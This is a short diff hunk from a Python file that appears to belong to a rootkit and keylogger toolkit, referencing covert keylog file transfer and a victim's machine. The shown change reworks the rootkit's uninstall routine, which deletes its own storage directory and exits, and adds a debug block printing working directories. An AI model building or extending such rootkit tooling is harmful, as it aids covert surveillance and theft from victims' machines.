@@ -3959,30 +3959,42 @@ def transfer_keylog_file_covert(sock: socket.socket, dest_ip: str,
         print(constants.MENU_CLOSING_BANNER)
 
 
-def uninstall(rootkit_name: str):
+def uninstall(rootkit_name: str, current_dir: str):
     """
     Uninstalls the rootkit from target/victim's
-    machine
+    machine.
 
     @param rootkit_name:
         A string representing the path of rootkit
 
+    @param current_dir:
+        A string representing a pointer to the
+        current directory
+
+        It is used for resetting if the alternate project name
+        is required
+
     @return: None
     """
-    # a) Get current path
+    # a) Get directory/path of rootkit storage (by going back 2 directories)
     print("[+] Now uninstalling rootkit: {}".format(rootkit_name))
-    original_path = os.getcwd()
 
-    # b) Get directory/path of rootkit storage (by going back 2 directories)
-    try:
-        os.chdir('..')
-        os.chdir('..')
-        directory_to_remove = rootkit_name
-        shutil.rmtree(directory_to_remove)
-    finally:
-        os.chdir(original_path)  # Reset ptr back to original path
+    os.chdir(current_dir)
+    os.chdir('..')
+    os.chdir('..')
+    directory_to_remove = rootkit_name
+    shutil.rmtree(directory_to_remove)
 
-    # c) Terminate the current process
+    # b) Terminate the current process
     print("[+] OPERATION SUCCESS: The rootkit has been successfully uninstalled!")
     print("[+] PROCESS TERMINATION: Now terminating main()...")
     sys.exit("[+] OPERATION SUCCESS: The main execution has been terminated!")
+
+
+if __name__ == '__main__':
+    original_path = os.getcwd()
+    print(original_path)
+
+    os.chdir('..')
+    os.chdir('..')
+    print(os.getcwd())
